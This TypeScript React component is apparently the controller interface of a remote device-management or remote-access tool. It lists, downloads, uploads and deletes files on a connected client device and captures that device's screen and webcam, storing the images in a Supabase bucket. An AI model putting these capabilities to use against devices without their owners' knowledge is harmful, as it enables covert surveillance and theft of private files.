import { useCallback, useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { useDeviceCommands } from "@/hooks/use-device-commands";
import {
  Folder, File, ArrowUp, RefreshCw, Download, Upload, Trash2,
  Camera, MonitorSmartphone, Loader2,
} from "lucide-react";

type Entry = { name: string; dir: boolean; size: number; mod: string };

function fmtSize(n: number): string {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  if (n < 1024 * 1024 * 1024) return `${(n / 1024 / 1024).toFixed(1)} MB`;
  return `${(n / 1024 / 1024 / 1024).toFixed(2)} GB`;
}

function b64ToBlob(b64: string, type: string): Blob {
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return new Blob([bytes], { type });
}

export function FilesPanel({ deviceId }: { deviceId: string }) {
  const { send, connected } = useDeviceCommands(deviceId);
  const [path, setPath] = useState("");
  const [parent, setParent] = useState("");
  const [entries, setEntries] = useState<Entry[]>([]);
  const [busy, setBusy] = useState(false);
  const [capturing, setCapturing] = useState<null | "screen" | "cam">(null);
  const fileInput = useRef<HTMLInputElement>(null);

  const list = useCallback(
    async (p?: string) => {
      setBusy(true);
      try {
        const r = await send("fs.list", p ? { path: p } : {});
        setPath(r.result.path);
        setParent(r.result.parent);
        const es = (r.result.entries as Entry[]).sort((a, b) =>
          a.dir === b.dir ? a.name.localeCompare(b.name) : a.dir ? -1 : 1,
        );
        setEntries(es);
      } catch (e: any) {
        toast.error(e.message);
      } finally {
        setBusy(false);
      }
    },
    [send],
  );

  useEffect(() => {
    if (connected) list();
  }, [connected, list]);

  const download = async (e: Entry) => {
    try {
      const r = await send("fs.download", { path: join(path, e.name) }, 60000);
      const blob = b64ToBlob(r.result.data, "application/octet-stream");
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = r.result.name;
      a.click();
      URL.revokeObjectURL(a.href);
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const upload = async (file: globalThis.File) => {
    if (file.size > 12 * 1024 * 1024) {
      toast.error("Max 12 MB per upload");
      return;
    }
    const buf = new Uint8Array(await file.arrayBuffer());
    let bin = "";
    for (let i = 0; i < buf.length; i++) bin += String.fromCharCode(buf[i]);
    try {
      await send("fs.upload", { path: join(path, file.name), data: btoa(bin) }, 60000);
      toast.success(`Uploaded ${file.name}`);
      list(path);
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const remove = async (e: Entry) => {
    if (!confirm(`Delete ${e.name}? No take-backs.`)) return;
    try {
      await send("fs.delete", { path: join(path, e.name) });
      toast.success("Deleted");
      list(path);
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const capture = async (kind: "screen" | "cam") => {
    setCapturing(kind);
    try {
      const r = await send(kind === "screen" ? "screenshot" : "camera.shot", {}, 45000);
      const blob = b64ToBlob(r.result.jpeg, "image/jpeg");
      const name = `${Date.now()}-${kind === "screen" ? "screenshot" : "webcam"}.jpg`;
      const { error } = await supabase.storage
        .from("client-files")
        .upload(`${deviceId}/${name}`, blob, { contentType: "image/jpeg" });
      if (error) throw error;
      toast.success("Saved — see Dashboard → Files");
    } catch (err: any) {
      toast.error(err.message);
    } finally {
      setCapturing(null);
    }
  };

  return (
    <div className="space-y-3">
      <div className="flex flex-wrap items-center gap-2">
        <button
          onClick={() => parent && parent !== path && list(parent)}
          disabled={busy || !parent || parent === path}
          className="inline-flex items-center gap-1.5 rounded-md border border-border/60 bg-secondary px-3 py-1.5 text-xs font-medium transition hover:bg-accent disabled:opacity-40"
        >
          <ArrowUp className="h-3 w-3" /> Up
        </button>
        <button
          onClick={() => list(path)}
          disabled={busy}
          className="inline-flex items-center gap-1.5 rounded-md border border-border/60 bg-secondary px-3 py-1.5 text-xs font-medium transition hover:bg-accent disabled:opacity-40"
        >
          <RefreshCw className={`h-3 w-3 ${busy ? "animate-spin" : ""}`} /> Refresh
        </button>
        <button
          onClick={() => fileInput.current?.click()}
          className="inline-flex items-center gap-1.5 rounded-md border border-border/60 bg-secondary px-3 py-1.5 text-xs font-medium transition hover:bg-accent"
        >
          <Upload className="h-3 w-3" /> Upload
        </button>
        <input
          ref={fileInput}
          type="file"
          className="hidden"
          onChange={(e) => {
            const f = e.target.files?.[0];
            if (f) upload(f);
            e.target.value = "";
          }}
        />
        <div className="flex-1" />
        <button
          onClick={() => capture("screen")}
          disabled={capturing !== null}
          className="inline-flex items-center gap-1.5 rounded-md bg-primary px-3 py-1.5 text-xs font-medium text-primary-foreground transition hover:opacity-90 disabled:opacity-40"
        >
          {capturing === "screen" ? <Loader2 className="h-3 w-3 animate-spin" /> : <MonitorSmartphone className="h-3 w-3" />}
          Screenshot
        </button>
        <button
          onClick={() => capture("cam")}
          disabled={capturing !== null}
          className="inline-flex items-center gap-1.5 rounded-md bg-primary px-3 py-1.5 text-xs font-medium text-primary-foreground transition hover:opacity-90 disabled:opacity-40"
        >
          {capturing === "cam" ? <Loader2 className="h-3 w-3 animate-spin" /> : <Camera className="h-3 w-3" />}
          Webcam photo
        </button>
      </div>

      <div className="rounded-md border border-border/60 bg-muted/20 px-3 py-1.5 font-mono text-xs text-muted-foreground">
        {path || "…"}
      </div>

      <div className="overflow-hidden rounded-xl border border-border/60 bg-card/60">
        <table className="w-full text-sm">
          <tbody>
            {entries.length === 0 && (
              <tr>
                <td className="px-4 py-8 text-center text-muted-foreground">
                  {busy ? "loading…" : connected ? "empty folder" : "waiting for device…"}
                </td>
              </tr>
            )}
            {entries.map((e) => (
              <tr key={e.name} className="border-t border-border/40 transition hover:bg-muted/20">
                <td className="px-4 py-2">
                  <button
                    className="inline-flex items-center gap-2 text-left"
                    onClick={() => e.dir && list(join(path, e.name))}
                  >
                    {e.dir ? (
                      <Folder className="h-4 w-4 text-primary" />
                    ) : (
                      <File className="h-4 w-4 text-muted-foreground" />
                    )}
                    <span className={e.dir ? "font-medium" : ""}>{e.name}</span>
                  </button>
                </td>
                <td className="w-24 px-4 py-2 text-right text-xs text-muted-foreground">
                  {e.dir ? "—" : fmtSize(e.size)}
                </td>
                <td className="w-40 px-4 py-2 text-right">
                  <div className="inline-flex items-center gap-1">
                    {!e.dir && (
                      <button
                        onClick={() => download(e)}
                        className="rounded p-1.5 text-muted-foreground transition hover:bg-accent hover:text-foreground"
                        title="Download"
                      >
                        <Download className="h-3.5 w-3.5" />
                      </button>
                    )}
                    <button
                      onClick={() => remove(e)}
                      className="rounded p-1.5 text-muted-foreground transition hover:bg-destructive/20 hover:text-destructive"
                      title="Delete"
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                    </button>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      <p className="text-[11px] text-muted-foreground">
        Screenshots and webcam photos are saved to Dashboard → Files under this client's folder.
      </p>
    </div>
  );
}

function join(dir: string, name: string): string {
  if (!dir) return name;
  const sep = dir.includes("\\") ? "\\" : "/";
  return dir.endsWith(sep) ? dir + name : dir + sep + name;
}
